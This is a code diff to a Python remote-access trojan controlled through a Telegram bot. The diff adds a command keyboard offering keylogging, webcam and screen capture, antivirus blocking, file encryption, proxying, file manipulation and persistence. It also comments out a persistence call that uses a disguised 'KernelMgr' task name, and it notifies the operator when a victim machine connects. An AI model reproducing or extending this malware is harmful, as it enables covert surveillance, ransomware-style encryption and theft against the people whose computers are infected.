@@ -30,7 +30,7 @@ import libs.persistence as persistence_lib
 
 
 REDIS_HOST = ""
-REDIS_PORT = 000
+REDIS_PORT = 00
 REDIS_PASS = ""
 
 TELEGRAM_BOT_TOKEN = ""
@@ -1281,6 +1281,92 @@ async def register_computer():
 
         await asyncio.sleep(30)
 
+keyboard_payload = {
+    "chat_id": NOTIFY_CHATID,
+    "text": "Choose a command",
+    "reply_markup": {
+        "keyboard": [
+            [
+                { "text": "/list_computers" },
+                { "text": "/set_computer" }
+            ],
+            [
+                { "text": "/status" },
+                { "text": "/sys_info" }
+            ],
+            [
+                { "text": "/screenshot" },
+                { "text": "/capture_webcam" },
+                { "text": "/list_cameras" }
+            ],
+            [
+                { "text": "/block_av" },
+                { "text": "/unblock_av" },
+                { "text": "/block_domain" },
+                { "text": "/unblock_domain" }
+            ],
+            [
+                { "text": "/start_keylogger" },
+                { "text": "/stop_keylogger" }
+            ],
+            [
+                { "text": "/encrypt_files" },
+                { "text": "/decrypt_files" }
+            ],
+            [
+                { "text": "/set_proxy" },
+                { "text": "/start_proxy" },
+                { "text": "/stop_proxy" }
+            ],
+            [
+                { "text": "/type" },
+                { "text": "/open_url" },
+                { "text": "/change_wallpaper" }
+            ],
+            [
+                { "text": "/set_volume" },
+                { "text": "/get_volume" }
+            ],
+            [
+                { "text": "/start_audio" },
+                { "text": "/stop_audio" }
+            ],
+            [
+                { "text": "/msg_box" },
+                { "text": "/jumpscare" }
+            ],
+            [
+                { "text": "/ps" },
+                { "text": "/pskill" }
+            ],
+            [
+                { "text": "/cd" },
+                { "text": "/pwd" },
+                { "text": "/ls" }
+            ],
+            [
+                { "text": "/move" },
+                { "text": "/copy" },
+                { "text": "/delete" },
+                { "text": "/mkdir" }
+            ],
+            [
+                { "text": "/tts" },
+                { "text": "/set_key" }
+            ],
+            [
+                { "text": "/apply_persistence" },
+                { "text": "/list_persistence_methods" },
+                { "text": "/persistence_help" }
+            ]
+        ],
+        "resize_keyboard": True,
+        "one_time_keyboard": False
+    }
+}
+
+
+
 async def main():
     """Main entry point for the local script."""
     print(f"Computer {COMPUTER_ID} is initializing...")
@@ -1291,17 +1377,26 @@ async def main():
 
     asyncio.create_task(register_computer())
 
-    persistence_lib.apply_persistence(method='task', stealth_name='KernelMgr', key_name='KernelMgr')
+    #persistence_lib.apply_persistence(method='task', stealth_name='KernelMgr', key_name='KernelMgr')
+
+
 
     await send_message(
         chat_id=NOTIFY_CHATID,
         text=f"{COMPUTER_ID} successfully connected!"
     )
+    response = requests.post(TELEGRAM_API_URL, json=keyboard_payload)
 
     print(f"Starting command listener for {COMPUTER_ID}...")
     await asyncio.gather(send_status_update(), command_listener())
 
 
+
+
+
+
+
 if __name__ == "__main__":
+
     asyncio.run(main())
 
